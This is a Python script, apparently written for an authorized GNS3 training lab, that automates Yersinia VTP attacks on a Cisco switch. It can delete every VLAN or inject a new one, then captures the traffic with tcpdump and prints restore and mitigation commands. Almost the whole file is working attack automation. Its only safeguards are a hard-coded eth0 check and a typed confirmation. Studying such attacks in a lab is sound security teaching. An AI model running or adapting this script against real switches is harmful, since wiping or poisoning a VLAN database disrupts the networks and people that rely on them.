"""
VTP attack lab helper for Kali inside an authorized GNS3 topology.

This script automates the exact Yersinia flow that worked in this lab:
- open Yersinia 0.8.2 interactive mode
- switch to VTP mode
- run attack 1: delete all VLANs, or attack 3: add one VLAN
- send VTP request attack 0 afterward so SW1 exchanges/accepts the database
- capture VTP with tcpdump for proof

Lab guardrails:
- eth0 only for VTP traffic
- no eth1/NAT attack traffic
- no packet flood loops
- asks before destructive actions
"""

import os
import pty
import re
import select
import shutil
import signal
import struct
import subprocess
import sys
import termios
import threading
import time
from datetime import datetime
from pathlib import Path

try:
    import fcntl
except ImportError:  # pragma: no cover
    fcntl = None


LAB_IFACE = "eth0"
LAB_DOMAIN = "ITLA"
DEFAULT_VLAN_ID = 845
DEFAULT_VLAN_NAME = "LAB"
VTP_BPF = (
    "ether dst 01:00:0c:cc:cc:cc and "
    "(ether[20:2] = 0x2003 or ether[24:2] = 0x2003)"
)


def banner():
    print(
        """
====================================================
 VTP ATTACK LAB - YERSINIA INTERACTIVE AUTOMATION
 Uso exclusivo en laboratorio autorizado GNS3
====================================================
"""
    )


def now():
    return datetime.now().strftime("%Y%m%d-%H%M%S")


def require_root():
    if os.geteuid() != 0:
        print("ERROR: ejecuta como root:")
        print("sudo python3 /home/kali/vtp-attack.py")
        sys.exit(1)


def require_tool(name):
    path = shutil.which(name)
    if not path:
        print(f"ERROR: falta {name}.")
        if name == "yersinia":
            print("Instala con: sudo apt update && sudo apt install -y yersinia")
        sys.exit(1)
    return path


def ask(prompt, default=None):
    suffix = f" [{default}]" if default is not None else ""
    value = input(f"{prompt}{suffix}: ").strip()
    if not value and default is not None:
        return str(default)
    return value


def ask_int(prompt, default, minimum=None, maximum=None):
    while True:
        value = ask(prompt, default)
        try:
            number = int(value)
        except ValueError:
            print("Escribe un numero valido.")
            continue

        if minimum is not None and number < minimum:
            print(f"Debe ser >= {minimum}.")
            continue
        if maximum is not None and number > maximum:
            print(f"Debe ser <= {maximum}.")
            continue
        return number


def ask_vlan_name(default):
    while True:
        value = ask("Nombre de VLAN para Yersinia", default).upper()
        value = re.sub(r"[^A-Z0-9_-]", "", value)
        if not value:
            print("El nombre no puede quedar vacio.")
            continue
        if len(value) > 12:
            print("Usa 12 caracteres o menos para evitar errores en Yersinia.")
            continue
        return value


def iface_exists(iface):
    return Path(f"/sys/class/net/{iface}").exists()


def iface_mac(iface):
    path = Path(f"/sys/class/net/{iface}/address")
    if not path.exists():
        return "unknown"
    return path.read_text(encoding="utf-8").strip()


def iface_state(iface):
    path = Path(f"/sys/class/net/{iface}/operstate")
    if not path.exists():
        return "unknown"
    return path.read_text(encoding="utf-8").strip()


def choose_iface():
    iface = ask("Interfaz conectada a SW1", LAB_IFACE)
    if iface != LAB_IFACE:
        print("ERROR: este lab solo permite eth0 para el ataque.")
        print("eth1 es Internet/NAT y no se usara para VTP.")
        sys.exit(1)
    if not iface_exists(iface):
        print("ERROR: eth0 no existe en esta Kali.")
        sys.exit(1)
    return iface


def print_switch_prereqs():
    print("\n[+] Requisitos esperados en SW1")
    print("vtp domain ITLA")
    print("vtp version 1")
    print("vtp mode server")
    print("sin vtp password")
    print("Gi0/1 trunk, native VLAN 1, allowed VLANs 1,10,20")
    print("\nComandos para evidencia antes/despues:")
    print("show vlan brief")
    print("show vtp status")
    print("show interfaces trunk")


def confirm(text):
    value = ask(text + " Escribe YES para continuar", "")
    return value == "YES"


class TcpdumpCapture:
    def __init__(self, iface, path):
        self.iface = iface
        self.path = Path(path)
        self.proc = None

    def start(self):
        args = [
            "tcpdump",
            "-eni",
            self.iface,
            "-vvv",
            "-s",
            "0",
            "-l",
            VTP_BPF,
        ]
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self.handle = self.path.open("w", encoding="utf-8", errors="replace")
        self.handle.write(f"# Started {datetime.now().isoformat(timespec='seconds')}\n")
        self.handle.write(f"# CMD: {' '.join(args)}\n")
        self.handle.flush()
        self.proc = subprocess.Popen(
            args,
            stdin=subprocess.DEVNULL,
            stdout=self.handle,
            stderr=subprocess.STDOUT,
            text=True,
            start_new_session=True,
        )
        time.sleep(1)

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                os.killpg(os.getpgid(self.proc.pid), signal.SIGINT)
                self.proc.wait(timeout=3)
            except Exception:
                try:
                    os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
                    self.proc.wait(timeout=3)
                except Exception:
                    try:
                        os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)
                    except Exception:
                        pass
        if hasattr(self, "handle"):
            self.handle.flush()
            self.handle.close()


class YersiniaInteractive:
    def __init__(self, raw_log):
        self.raw_log = Path(raw_log)
        self.pid = None
        self.fd = None
        self.stop_reader = threading.Event()
        self.reader = None
        self.raw_handle = None

    def start(self):
        self.raw_log.parent.mkdir(parents=True, exist_ok=True)
        self.raw_handle = self.raw_log.open("wb")
        pid, fd = pty.fork()
        if pid == 0:
            os.environ["TERM"] = "xterm"
            os.environ["LINES"] = "40"
            os.environ["COLUMNS"] = "120"
            os.execvp("yersinia", ["yersinia", "-I"])

        self.pid = pid
        self.fd = fd
        self._set_window(40, 120)
        self.reader = threading.Thread(target=self._read_loop, daemon=True)
        self.reader.start()
        time.sleep(1)

    def _set_window(self, rows, cols):
        if fcntl is None or self.fd is None:
            return
        winsz = struct.pack("HHHH", rows, cols, 0, 0)
        try:
            fcntl.ioctl(self.fd, termios.TIOCSWINSZ, winsz)
        except OSError:
            pass

    def _read_loop(self):
        while not self.stop_reader.is_set():
            try:
                readable, _, _ = select.select([self.fd], [], [], 0.2)
                if not readable:
                    continue
                data = os.read(self.fd, 4096)
                if not data:
                    break
                if self.raw_handle:
                    self.raw_handle.write(data)
                    self.raw_handle.flush()
            except OSError:
                break

    def send(self, data, delay=0.7):
        if self.fd is None:
            return
        if isinstance(data, str):
            data = data.encode()
        os.write(self.fd, data)
        time.sleep(delay)

    def select_vtp_mode(self):
        print("[+] Abriendo modo VTP en Yersinia...")
        self.send("\r", 1.0)       # splash
        self.send(" ", 0.5)        # warning window, if present
        self.send("g", 0.8)        # protocol menu
        self.send("\x1bOB\r", 1.2) # one down from STP to VTP, then enter

    def send_request(self):
        print("[+] Enviando VTP request para forzar intercambio...")
        self.send("x", 0.8)
        self.send("0", 2.0)

    def delete_all_vlans(self):
        print("[+] Ejecutando ataque 1: borrar todas las VLAN...")
        self.send("x", 0.8)
        self.send("1", 2.0)
        self.send_request()

    def add_vlan(self, vlan_id, vlan_name):
        print(f"[+] Ejecutando ataque 3: agregar VLAN {vlan_id} ({vlan_name})...")
        self.send("x", 0.8)
        self.send("3", 0.8)
        self.send(f"{vlan_id:04d}", 0.5)
        self.send(f"{vlan_name}\r", 2.0)
        self.send_request()

    def stop(self):
        if self.pid:
            try:
                pgid = os.getpgid(self.pid)
            except Exception:
                pgid = None
            try:
                if pgid is not None:
                    os.killpg(pgid, signal.SIGINT)
                else:
                    os.kill(self.pid, signal.SIGINT)
                time.sleep(1)
            except Exception:
                pass
            try:
                if pgid is not None:
                    os.killpg(pgid, signal.SIGTERM)
                else:
                    os.kill(self.pid, signal.SIGTERM)
            except Exception:
                pass
        self.stop_reader.set()
        if self.fd is not None:
            try:
                os.close(self.fd)
            except OSError:
                pass
        if self.reader:
            self.reader.join(timeout=2)
        if self.raw_handle:
            self.raw_handle.close()


def run_cli_vtp_request(iface, seconds=3):
    args = ["yersinia", "vtp", "-interface", iface, "-attack", "0"]
    try:
        subprocess.run(
            args,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=seconds,
            check=False,
        )
    except subprocess.TimeoutExpired:
        pass


def parse_vtp_packets(text):
    packets = []
    current = None
    header_re = re.compile(
        r"^(?P<time>\d\d:\d\d:\d\d\.\d+)\s+"
        r"(?P<src>(?:[0-9a-f]{2}:){5}[0-9a-f]{2})\s+>\s+"
        r"01:00:0c:cc:cc:cc,.*Message (?P<kind>[^,]+)",
        re.IGNORECASE,
    )
    rev_re = re.compile(r"Config Rev (?P<rev>[0-9a-fA-F]+)")
    vlan_re = re.compile(r"VLAN-id (?P<vid>\d+),.*?Name (?P<name>[^\n]+)")

    for line in text.splitlines():
        header = header_re.search(line)
        if header:
            if current:
                packets.append(current)
            current = {
                "time": header.group("time"),
                "src": header.group("src").lower(),
                "kind": header.group("kind").strip(),
                "rev": None,
                "vlans": [],
            }
            continue

        if current is None:
            continue

        rev = rev_re.search(line)
        if rev:
            current["rev"] = rev.group("rev")
            continue

        vlan = vlan_re.search(line)
        if vlan:
            current["vlans"].append((int(vlan.group("vid")), vlan.group("name").strip()))

    if current:
        packets.append(current)

    return packets


def parse_capture(path, vlan_id=None):
    text = Path(path).read_text(encoding="utf-8", errors="replace")
    packets = parse_vtp_packets(text)
    revs = [pkt["rev"] for pkt in packets if pkt["rev"]]
    subset_packets = [pkt for pkt in packets if pkt["vlans"]]
    final_subset = subset_packets[-1] if subset_packets else None

    print("\n[+] Resumen de captura tcpdump")
    print(f"Archivo: {path}")
    if revs:
        print(f"Revisiones VTP vistas: {', '.join(revs[-6:])}")
    else:
        print("No vi revisiones VTP en la captura.")

    if final_subset:
        print(
            "Ultima base VTP anunciada: "
            f"{final_subset['time']} src={final_subset['src']} rev={final_subset['rev']}"
        )
        print("VLANs finales vistas en el ultimo subset:")
        for vid, name in final_subset["vlans"]:
            print(f" - {vid} {name}")
    else:
        print("No vi entradas VLAN en anuncios subset.")

    if vlan_id is not None:
        final_ids = {vid for vid, _name in final_subset["vlans"]} if final_subset else set()
        if vlan_id in final_ids:
            print(f"\n[+] Evidencia final: la VLAN {vlan_id} aparece en la DB VTP.")
        else:
            print(f"\n[!] La VLAN {vlan_id} no aparece en la DB VTP final.")


def run_attack(iface, attack, vlan_id=None, vlan_name=None, duration=10):
    timestamp = now()
    cap_path = f"/tmp/vtp-attack-{timestamp}.log"
    raw_path = f"/tmp/vtp-yersinia-{timestamp}.raw"

    capture = TcpdumpCapture(iface, cap_path)
    yersinia = YersiniaInteractive(raw_path)

    print(f"\n[+] Captura tcpdump: {cap_path}")
    print(f"[+] Log bruto Yersinia: {raw_path}")

    try:
        capture.start()
        yersinia.start()
        yersinia.select_vtp_mode()

        if attack == "delete":
            yersinia.delete_all_vlans()
        elif attack == "add":
            yersinia.add_vlan(vlan_id, vlan_name)
        else:
            raise ValueError("ataque desconocido")

        print(f"[+] Esperando {duration} segundos para que SW1 procese VTP...")
        time.sleep(duration)

        print("[+] Mandando request CLI extra para verificar DB actual...")
        run_cli_vtp_request(iface)
        time.sleep(3)
    finally:
        yersinia.stop()
        capture.stop()

    parse_capture(cap_path, vlan_id if attack == "add" else None)
    print("\n[+] Valida ahora en SW1:")
    print("show vlan brief")
    print("show vtp status")
    print("show interfaces trunk")


def show_restore_commands():
    print(
        """
Comandos para restaurar una demo basica en SW1:

configure terminal
vlan 10
 name KALI
vlan 20
 name PRODUCCION
interface gi0/0
 switchport access vlan 20
interface gi0/2
 switchport access vlan 20
interface gi0/1
 switchport mode trunk
 switchport trunk native vlan 1
 switchport trunk allowed vlan 1,10,20
end
write memory

Mitigacion para cerrar el fallo:

configure terminal
vtp mode transparent
interface gi0/1
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate
end
write memory
"""
    )


def main():
    banner()
    require_root()
    require_tool("yersinia")
    require_tool("tcpdump")

    iface = choose_iface()
    print(f"\n[+] {iface}: state={iface_state(iface)} mac={iface_mac(iface)}")
    print_switch_prereqs()

    print(
        """
Selecciona accion:
1 - Borrar todas las VLAN por VTP
2 - Agregar una VLAN por VTP
3 - Solo mandar VTP request y capturar DB actual
4 - Mostrar comandos de restauracion/mitigacion
"""
    )
    choice = ask_int("Opcion", 2, 1, 4)

    if choice == 1:
        print("\n[!] Esto borra la base de VLANs del lab si SW1 acepta el VTP.")
        if not confirm("Confirmas que estas en el GNS3 autorizado?"):
            print("Cancelado.")
            return
        run_attack(iface, "delete", duration=10)
        return

    if choice == 2:
        vlan_id = ask_int("VLAN ID a agregar", DEFAULT_VLAN_ID, 2, 1001)
        vlan_name = ask_vlan_name(DEFAULT_VLAN_NAME)
        print(f"\n[!] Esto intentara agregar VLAN {vlan_id} ({vlan_name}) por VTP.")
        if not confirm("Confirmas que estas en el GNS3 autorizado?"):
            print("Cancelado.")
            return
        run_attack(iface, "add", vlan_id=vlan_id, vlan_name=vlan_name, duration=10)
        return

    if choice == 3:
        timestamp = now()
        cap_path = f"/tmp/vtp-verify-{timestamp}.log"
        capture = TcpdumpCapture(iface, cap_path)
        try:
            capture.start()
            run_cli_vtp_request(iface)
            time.sleep(5)
        finally:
            capture.stop()
        parse_capture(cap_path)
        return

    if choice == 4:
        show_restore_commands()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Cancelado por el usuario.")
